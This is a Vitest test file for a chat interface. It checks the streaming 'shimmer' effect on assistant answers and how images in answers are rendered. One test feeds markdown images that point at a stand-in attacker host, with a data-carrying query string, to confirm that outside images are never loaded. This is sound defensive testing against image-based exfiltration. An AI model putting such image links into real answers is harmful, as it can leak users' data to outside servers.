// The light over the words of an answer being written (shimmer.ts): on while the words come, going
// out for SHIMMER_FADE_MS after the last one, never on a broken answer, on the history or on words
// the agent has finished before calling a tool.
import type { AssistantMessage, Message } from '@copilotkit/react-core';
import { act, render, waitFor } from '@testing-library/react';
import { MemoryRouter } from 'react-router';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { RequireAuth, SessionProvider } from '../auth/session.tsx';
import { ME, mockServer } from '../test/fetch-mock.ts';
import { ToastProvider } from '../ui/Toast.tsx';
import { AnswerText } from '../answer/AnswerText.tsx';
import { AssistantTurn } from './AssistantMessage.tsx';
import { ChatExtrasContext, type ChatExtras } from '../answer/chat-context.ts';
import { SHIMMER_FADE_MS } from '../answer/shimmer.ts';

vi.mock('@copilotkit/react-core', async (original) => ({
  ...(await original<typeof import('@copilotkit/react-core')>()),
  useRenderToolCall: () => () => null,
}));

const shimmer = (container: HTMLElement) => container.querySelector<HTMLElement>('[data-answer-text]')?.dataset.shimmer;

describe('the light over an answer being written', () => {
  beforeEach(() => vi.useFakeTimers());
  afterEach(() => vi.useRealTimers());

  it('runs while the words come and goes out softly once they stop', () => {
    const { container, rerender } = render(<AnswerText text="Сейчас посчитаю" streaming failed={false} />);
    expect(shimmer(container)).toBe('writing');
    expect(container.querySelector<HTMLElement>('[data-answer-text]')!.style.getPropertyValue('--shimmer-fade')).toBe(`${SHIMMER_FADE_MS}ms`);

    rerender(<AnswerText text="Сейчас посчитаю. Готово." streaming={false} failed={false} />);
    expect(shimmer(container)).toBe('fading');
    act(() => {
      vi.advanceTimersByTime(SHIMMER_FADE_MS - 1);
    });
    expect(shimmer(container)).toBe('fading');
    act(() => {
      vi.advanceTimersByTime(1);
    });
    expect(shimmer(container)).toBeUndefined();
  });

  it('starts again when the same words go on after a pause', () => {
    const { container, rerender } = render(<AnswerText text="Ищу" streaming failed={false} />);
    rerender(<AnswerText text="Ищу" streaming={false} failed={false} />);
    rerender(<AnswerText text="Ищу сделки" streaming failed={false} />);
    expect(shimmer(container)).toBe('writing');
    act(() => {
      vi.advanceTimersByTime(SHIMMER_FADE_MS * 2);
    });
    expect(shimmer(container)).toBe('writing');
  });

  // The light is the only sign of writing: CopilotKit's caret was a stray dot after the words (owner, 19.11).
  it('draws no caret after the words being written', () => {
    const { container } = render(<AnswerText text="Пакет от Ikon уже приходил" streaming failed={false} />);
    expect(container.textContent).toContain('Пакет от Ikon уже приходил');
    expect(container.querySelector('[data-streaming-markdown-caret]')).toBeNull();
  });

  // A picture of an answer only from our own server (spec, section 8.30): another site's is a link, never loaded.
  it('shows a picture of our own server and names another site’s as a link without loading it', () => {
    const { container } = render(<AnswerText text={'![план](/app/api/threads/t1/file?path=plan.png) ![x](https://evil.example/x.png?d=4510123456) ![y](//evil.example/y.png)'} streaming={false} failed={false} />);
    const images = [...container.querySelectorAll('img')];
    expect(images.map((i) => i.getAttribute('src'))).toEqual(['/app/api/threads/t1/file?path=plan.png']);
    const links = [...container.querySelectorAll('a')];
    expect(links.map((a) => a.textContent)).toEqual(['Картинка: evil.example/x.png', 'Картинка: evil.example/y.png']);
    expect(links[0]).toHaveAttribute('rel', 'noopener noreferrer');
  });

  it('names a data: picture of an answer without a link and without its text', () => {
    const { container } = render(<AnswerText text={'![x](data:image/png;base64,iVBORw0KGgo=)'} streaming={false} failed={false} />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('a')).toBeNull();
    expect(container.textContent).toContain('Картинка с другого сайта не показывается');
  });

  it('is never on an answer that broke', () => {
    const { container, rerender } = render(<AnswerText text="Начало ответа" streaming failed={false} />);
    rerender(<AnswerText text="Начало ответа" streaming={false} failed />);
    expect(shimmer(container)).toBeUndefined();
  });

  it('is not on the history', () => {
    const { container } = render(<AnswerText text="Вчерашний ответ" streaming={false} failed={false} />);
    expect(shimmer(container)).toBeUndefined();
    expect(container).toHaveTextContent('Вчерашний ответ');
  });
});

describe('the light in a turn of the agent', () => {
  const EXTRAS: ChatExtras = {
    agent: { id: 'sales', name: 'Продажи', description: '', starters: [], mark: { kind: 'icon', icon: 'spark' }, actions: {}, systems: { tools: {}, prefixes: {} } },
    agentId: 'sales',
    threadId: 't1',
    draft: false,
    attachments: [],
    addAttachment: vi.fn(),
    removeAttachment: vi.fn(),
    clearAttachments: vi.fn(),
    onSubmitted: vi.fn(),
    onRunFinished: vi.fn(),
    onThreadTitled: vi.fn(),
    onUploadError: vi.fn(),
    interrupt: null,
    failure: null,
    onFailure: vi.fn(),
    interruptedIds: [],
    keepInterrupted: vi.fn(),
    onTurnsFailed: vi.fn(),
    composerExtra: null,
    composerNotice: null,
  };
  const WORDS: AssistantMessage = { id: 'a1', role: 'assistant', content: 'Сейчас соберу документ.' };
  // AG-UI puts the calls of a step on the message of the words said before them.
  const WORDS_AND_CALL: AssistantMessage = { ...WORDS, toolCalls: [{ id: 'c1', type: 'function', function: { name: 'show_file', arguments: '{}' } }] };

  async function showTurn(turn: AssistantMessage[]) {
    mockServer({ 'GET /app/api/me': { body: ME } });
    const messages: Message[] = [{ id: 'u1', role: 'user', content: 'Сделай КП в Word' }, ...turn];
    const view = render(
      <MemoryRouter>
        <SessionProvider>
          <ToastProvider>
            <RequireAuth>
              <ChatExtrasContext value={EXTRAS}>
                <AssistantTurn turn={turn} messages={messages} streaming />
              </ChatExtrasContext>
            </RequireAuth>
          </ToastProvider>
        </SessionProvider>
      </MemoryRouter>,
    );
    await waitFor(() => expect(view.container.querySelector('[data-answer-text]')).toHaveTextContent('Сейчас соберу документ.'));
    return shimmer(view.container);
  }

  it('is on the words being written', async () => {
    expect(await showTurn([WORDS])).toBe('writing');
  });

  it('is not on words followed by a call while the call runs', async () => {
    expect(await showTurn([WORDS_AND_CALL])).toBeUndefined();
  });

  it('is not on the words of an earlier step while the next one starts', async () => {
    expect(await showTurn([WORDS, { id: 'a2', role: 'assistant', content: '' }])).toBeUndefined();
  });
});
